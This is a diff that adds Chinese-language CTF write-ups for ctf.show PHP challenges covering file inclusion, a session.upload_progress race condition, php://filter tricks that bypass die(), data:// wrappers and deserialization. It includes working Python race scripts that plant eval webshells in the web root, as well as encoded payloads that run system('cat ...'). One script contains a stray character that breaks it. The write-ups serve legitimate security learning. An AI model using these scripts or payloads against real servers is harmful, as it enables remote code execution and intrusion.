@@ -888,7 +888,7 @@ POST /?file=Php://input HTTP/1.1
 <?Php system("cat flag.php");?>
 ```
 
-#### ![image-20241121202826975](./assets/image-20241121202826975.png)
+![image-20241121202826975](./assets/image-20241121202826975.png)
 
 #### web81
 
@@ -931,6 +931,410 @@ if(isset($_GET['file'])){
 ![image-20241121204644174](./assets/image-20241121204644174.png)
 
 #### Web82
+
+##### 什么是session.upload_progress？
+
+这是一道关于利用session.upload_progress进行文件包含利用的题目
+
+详看：[利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)
+
+or bp方法：[CTF | 天下武功唯快不破之条件竞争漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/275557.html)
+
+
+
+poc1
+
+```python
+from requests import get, post
+from io import BytesIO
+from threading import Thread
+from urllib.parse import urljoin
+
+URL = 'http://20caa3d5-f3fe-4b17-ba5a-df917a1146ab.challenge.ctf.show/'
+PHPSESSID = 'shell'
+
+
+def write():
+    code = "<?php file_put_contents('/var/www/html/shell.php', '<?php @eval($_GET[1]);?>');?>"
+    data = {'PHP_SESSION_UPLOAD_PROGRESS': code}
+    cookies = {'PHPSESSID': PHPSESSID}
+    files = {'file': ('xxx.txt', BytesIO(b'x' * 10240))}
+    while True:
+        post(URL, data, cookies=cookies, files=files)
+
+
+def read():
+    params = {'file': f'/tmp/sess_{PHPSESSID}'}
+    while True:
+        get(URL, params)
+        url = urljoin(URL, 'shell.php')
+        code = get(url).status_code.real
+        print(f'{url} {code}')
+        if code == 200:
+            exit()
+
+
+if __name__ == '__main__':
+    Thread(target=write, daemon=True).start()
+    read()
+```
+
+
+
+poc2
+
+```php
+import requests
+import io
+import threading
+
+url='http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/'
+sessionid='ctfshow'
+data={
+	"1":"file_put_contents('/var/www/html/jiuzhen.php','<?php eval($_POST[3]);?>');"
+}
+#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。
+def write(session):#/tmp/sess_ctfshow中写入一句话木马。
+	fileBytes = io.BytesIO(b'a'*1024*50)
+	while True:
+		response=session.post(url,
+			data={
+			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
+			},
+			cookies={
+			'PHPSESSID':sessionid
+			},
+			files={
+			'file':('ctfshow.jpg',fileBytes)
+			}
+			)
+
+def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。
+	while True:
+		response=session.post(url+'?file=/tmp/sess_'+sessionid,data=data,
+			cookies={
+			'PHPSESSID':sessionid
+			}
+			)
+		resposne2=session.get(url+'jiuzhen.php');#访问木马文件，如果访问到了就代表竞争成功
+		if resposne2.status_code==200:了
+			print('++++++done++++++')
+		else:
+			print(resposne2.status_code)
+
+if __name__ == '__main__':
+
+	evnet=threading.Event()
+	#写入和访问分别设置5个线程。
+	with requests.session() as session:
+		for i in range(5):
+			threading.Thread(target=write,args=(session,)).start()
+		for i in range(5):
+			threading.Thread(target=read,args=(session,)).start()
+
+	evnet.set()
+```
+
+
+
+![image-20241123014155194](assets/image-20241123014155194.png)
+
+getshell
+
+![image-20241123014312621](assets/image-20241123014312621.png)
+
+直接查flag
+
+**利用条件**
+
+> 1. 存在文件包含漏洞
+> 2. 知道session文件存放路径，可以尝试默认路径
+> 3. 具有读取和写入session文件的权限
+
+这两个脚本理论上适用于`web82-web86`
+
+#### web83
+
+web83的开篇设置了session_unset();session_destroy();
+
+> session_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。
+> session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。
+
+就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。
+
+#### web84
+
+加上了一个`system(rm -rf /tmp/*);`，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）
+
+#### web84
+
+加上了一个system(rm -rf /tmp/*);，因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）
+
+#### web85
+
+添加了一个内容识别，如果有<就die，依旧可以竞争。
+
+#### web86
+
+dirname(__FILE__)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。
+include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。
+脚本里用的是完整路径，不影响竞争。
+
+> web82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757
+
+#### web87
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 21:57:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $content = $_POST['content'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    $file = str_replace(".", "???", $file);
+    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
+
+    
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+> 使用 `file_put_contents` 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 `<?php die('大佬别秀了');?>` 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 `$_POST` 中获取的 `$content` 变量的值。
+
+这道题需要用到php://filter
+
+------
+
+
+
+##### php://filter的使用 
+
+原文：[谈一谈php://filter的妙用 | 离别歌](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
+
+php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误`parser error : StartTag: invalid element name` 。其原因是，PHP是基于标签的脚本语言，`<?php ... ?>`这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。
+
+那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。
+
+php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：
+
+```
+readfile("php://filter/read=convert.base64-encode/resource=php://input");
+```
+
+如下：
+
+[![QQ截图20160724234603.png](assets/thum-0f851469385893.png)](https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png)
+
+所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。
+
+如下，我们使用的是`php://filter/read=convert.base64-encode/resource=./xxe.php`
+
+[![QQ截图20160724235335.png](assets/thum-693b1469385893.png)](https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png)
+
+------
+
+
+
+回归正题
+
+我们审一下这道题目的代码
+
+相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件
+
+```php
+ $content = $_POST['content'];
+ file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
+```
+
+这道题在`$content`和`$file`之间拼接了一个<?php die('大佬别秀了');?>，导致即使我们成功写入一句话，也执行不了
+
+我们如何绕过这个die呢？
+
+其实我们可以通过php://filter流的base64-decode方法来去除这个die
+
+因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下
+
+```php
+<?php
+$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
+base64_decode($_GET['txt']);
+```
+
+所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<、?、;、>、、(、) 、'空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。
+
+`”phpdie“`一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，"phpdie"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。
+
+同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码
+
+> warning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）
+
+poc:
+
+```
+原文：file=php://filter/write=convert.base64-decode/resource=shell.php
+
+file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30
+```
+
+```
+原文：content=<?php system('cat fl0g.php');?>
+
+content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg==
+```
+
+访问shell.php,得到flag
+
+其实还可以通过其他编码来进行绕过如rot13
+
+更多[file_put_content和死亡·杂糅代码之缘 - 先知社区](https://xz.aliyun.com/t/8163?time__1311=n4%2BxnD0Dc7GQ0%3DDCDgADlhjm57IKvq0Ivo%2BimK%3Dx#toc-3)
+
+#### web88
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-17 02:27:25
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+ */
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    if(preg_match("/php|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\./i", $file)){
+        die("error");
+    }
+    include($file);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这题过滤了很多字符但是没有过滤:、/、;
+
+poc
+
+```
+?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4
+```
+
+### 反序列化
+
+#### web254
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this->isVip;
+    }
+    public function login($u,$p){
+        if($this->username===$u&&$this->password===$p){
+            $this->isVip=true;
+        }
+        return $this->isVip;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this->isVip){
+            global $flag;
+            echo "your flag is ".$flag;
+        }else{
+            echo "no vip, no flag";
+        }
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) && isset($password)){
+    $user = new ctfShowUser();
+    if($user->login($username,$password)){
+        if($user->checkVip()){
+            $user->vipOneKeyGetFlag();
+        }
+    }else{
+        echo "no vip,no flag";
+    }
+}
+```
+
+看着很长，实际上审一下代码发现账号和密码已经放出来了
+
+```
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+```
+
+poc
+
+```
+/?username=xxxxxx&password=xxxxxx
+```
+
+#### web255
+
+相比上一题只是把
+
+```
+$user = new ctfShowUser();
+```
+
+改为了
+
+```
+$user = unserialize($_COOKIE['user']);
+```
+
+区别不大只需要通过反序列化的方式实例化ctfShowUser()即可
+
+```
+$user = new ctfShowUser();
+$user->isVip=true; //不能漏
+echo urlencode(serialize($user));
+```
+
+传参拿到flag
+
+#### web256
 
 
 
